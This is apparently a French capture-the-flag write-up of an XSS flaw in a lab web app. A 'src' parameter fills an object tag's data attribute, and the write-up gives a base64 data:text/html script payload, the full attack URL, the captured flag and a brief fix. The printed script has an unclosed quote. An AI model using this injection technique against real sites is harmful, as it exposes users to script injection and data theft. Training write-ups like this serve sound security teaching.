# Explication

Nom de la faille: XSS_Object

On va sur l'URL http://10.11.200.169/?page=media&src=nsa .

En inspectant le code source de la page, on voit une balise `object` avec l'attribut `data`.

L'attribut `data`, se remplit en fonction du paramètre `src`: de l'URL.

En se renseignant un peu sur les injections de code dans l'object data.

https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs

On peut spécifier le type de la data, encoder un script en base64. Qui va ensuite être excuté dans la balise object.

```
<script>alert("COUCOU);</script>
```

On encode donc la ligne ci-dessus en base64. Ce qui nous donne: `PHNjcmlwdD5hbGVydCgiQ09VQ09VKTs8L3NjcmlwdD4lCg==`

On obtient:
http://10.11.200.169/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiQ09VQ09VKTs8L3NjcmlwdD4lCg==

Ce qui nous permet de récuperer le flag: `928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`

# Comment profiter de la faille ?

Le hacker peut profiter de la faille en envoyant à un uttilsateur du site le lien, avec un script qui installe un malware sur l'ordinateur du client.

Ou qui récupère des données confidentielles.

etc ...

# Comment la fix

Il ne faut pas mettre en paramètre d'URL. Un paramètre permettant d'injecter du code dans une balise `object`.

Dans ce cas là, il aurait fallu mettre directement la source de l'image dans l'élement data.
